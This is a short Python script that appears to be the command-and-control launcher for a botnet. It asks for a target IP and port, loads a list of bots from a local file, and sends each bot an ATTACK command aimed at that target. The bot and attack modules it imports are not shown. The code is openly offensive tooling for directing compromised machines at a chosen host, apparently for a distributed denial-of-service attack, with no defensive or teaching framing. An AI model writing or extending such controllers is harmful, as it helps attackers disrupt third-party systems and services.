from cnc_server import CnCServer
import ultils
from bot import Bot

if __name__ == "__main__":
    IP = input("Enter IP: ")
    Port = input("Enter Port: ")
    print("IP & Port:", IP, Port)
    target = { ultils.TARGET: IP, ultils.PORT: Port}
    command = {ultils.COMMAND: ultils.ATTACK, ultils.DATA: ultils.dictionary_to_json(target)}	
    bots = ultils.load_bot(ultils.FILE_LOCAL)
    for bot in bots:
        bot.connect()
        bot.send_data(ultils.dictionary_to_json(command))